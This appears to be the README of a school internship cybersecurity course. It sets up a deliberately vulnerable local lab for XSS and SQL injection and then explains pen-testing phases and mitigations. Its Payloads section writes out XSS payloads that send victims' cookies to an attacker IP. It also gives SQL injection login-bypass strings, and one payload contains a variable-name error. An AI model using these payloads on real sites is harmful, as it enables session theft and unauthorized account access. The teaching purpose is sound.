# G. Galilei Internship Cyber security course
This repository collects tools and methodologies used during the system security internship with the students of the G. Galilei Institute.

## Students
1. Dario Collini
2. Andrea Di Caro

## Analyzed vulnerabilities
- XSS
  - Reflected
  - Stored
- SQL injection

## Start the Vulnerable lab
- Install docker for windows
- Clone\download this repository
- Start docker
- Open a command prompt inside the project root directory and execute the following command:

  	  docker compose up --build

## Start the attacker web server
In ordeer to collect stolen cookies we use a simple http server. Lunch it using:

	python -m http.server

### For XSS vulnerabilities
- Visit: http://localhost:9000/xss.php

### SQLi vulnerability
- Visit: http://localhost:9000/sqlI.php 

## Payloads
### XSS Reflected
    <script>window.location.href="http://<attacker IP>:8000/a.html?c="+document.cookie</script>
### XSS Stored
Not the best approach, generates a bunch of requests, very loud

    <img src="x" onerror=this.src='http://<attacker IP>:8000/'+document.cookie; />
    
More stealth, use this one

    <script>i=document.createElement('img');i.src='http://<attacker IP>:8000/'+document.cookie;document.body.appendChild(img)</script>
    
### SqlI
To gain access to the first account saved in the database

    a' OR 1=1 --
To gain access to an account by knowing the username

    [username]' OR 1=1 --

  # Black Box vs White Box Penetration Testing

Penetration testing is categorized into three main types based on the level of information and access provided to the tester: **black box**, **white box**, and **gray box**.

### Black Box Penetration Testing
- **Definition**: Simulates an attack from an external hacker with no prior knowledge of the system.
- **Process**: The tester gathers all necessary information through reconnaissance and attempts to exploit vulnerabilities.
- **Use Case**: Ideal for assessing the security of external-facing assets and services.

### White Box Penetration Testing
- **Definition**: The tester is provided with comprehensive system information (e.g., source code, architecture diagrams, and credentials).
- **Process**: This allows for a deep, thorough examination of both internal and external vulnerabilities.
- **Use Case**: Most time-consuming, requires significant data review. Provides an exhaustive security evaluation.

### Gray Box Penetration Testing
- **Definition**: A compromise between black and white box testing, where the tester is given partial information (e.g., login credentials or partial architecture details).
- **Use Case**: Suitable for understanding potential insider threats or risks from authenticated users. More time- and cost-effective than black box testing.

---

# Pen Test Life Cycle

The life cycle of a penetration test consists of five main phases: **reconnaissance**, **scanning**, **exploitation of vulnerabilities**, **maintaining access**, and **reporting**.

### Reconnaissance
- **Description**: Gathering information about the system or infrastructure to be tested, including public data, network mapping, and identifying active services.

### Scanning
- **Description**: Performing automated and semi-automated scans to identify vulnerabilities in the system. This includes port scanning, service and application enumeration, and user identification.

### Exploitation of Vulnerabilities
- **Description**: The tester attempts to exploit identified vulnerabilities to access the system, using techniques such as SQL injection or XSS.

### Maintaining Access
- **Description**: If the tester successfully gains access, they may attempt to maintain access to explore further or execute subsequent attacks.

### Reporting
- **Description**: Creating a detailed report describing the identified vulnerabilities, how they were exploited, and the necessary actions to mitigate them. This report is used to improve system security.

Each phase builds on information gathered in previous stages and may require additional details or verification throughout the process.


## Vulnerabilities Scenario and actions
### Steps for Vulnerability Analysis

#### 1. Information Gathering:
- **Application Observation**: Analyze the web application to identify points where user input is used to create SQL queries. These may include login forms, search forms, or any other form that interacts with the database.
- **Identifying Vulnerable Parameters**: Identify which parameters (e.g., query string, form fields, cookies) could be vulnerable to SQLi.

#### 2. Injection Testing:
- **Manipulated Input**: Inject various test payloads, such as `<script>alert(0);</script>`. A vulnerable application will run the script and display the alert.
- Once testing confirms vulnerability, the attacker may proceed with one of the following attack types:

---

### SQL Injection

**SQL Injection** occurs when attackers exploit flaws in poorly written PHP code to inject malicious code into a web application, leading to the execution of arbitrary commands on the server.

---

### Cross-Site Scripting (XSS)

**Cross-Site Scripting (XSS)** occurs when the server or application does not properly sanitize user input, allowing attackers to inject malicious scripts into web pages that will be executed in the browsers of users visiting the page.

#### There are 2 types of Cross-Site Scripting (XSS):
1. **Stored XSS**  
   Stored XSS is a type of Cross-Site Scripting where the malicious script injected by the attacker is stored on the server (e.g., in a database, file, or log).

2. **Reflected XSS**  
   Reflected XSS is a type of Cross-Site Scripting where the malicious code is not stored on the server but is instead reflected immediately in the server's response.

---

### Key Difference in Cookie Theft Methods Between Stored and Reflected XSS:

- **Stored XSS**: In this case, the attacker can redirect the user’s cookie to their own web server, which is always listening. This allows the attacker to steal the cookie every time someone visits the page.
  
- **Reflected XSS**: Here, the attacker needs the user to open a malicious link that leads to a website with a command that allows the attacker to redirect the user’s cookie toward them. This can only be done with some prior social engineering research to trick the user into clicking the link.

---

### Mitigation:

Mitigation refers to the methods we can use to make our websites secure and protected against these types of attacks.

- **Input Sanitization**: Filter user input to remove any malicious HTML or JavaScript tags.
  
- **Output Escaping**: Escape user input before displaying it on the HTML page, meaning converting special characters into sequences that are not interpreted as code by the browser.

- **Setting a Content Security Policy (CSP)**: Use a CSP to limit executable resources in the browser (such as scripts and styles) and prevent the execution of unauthorized scripts.


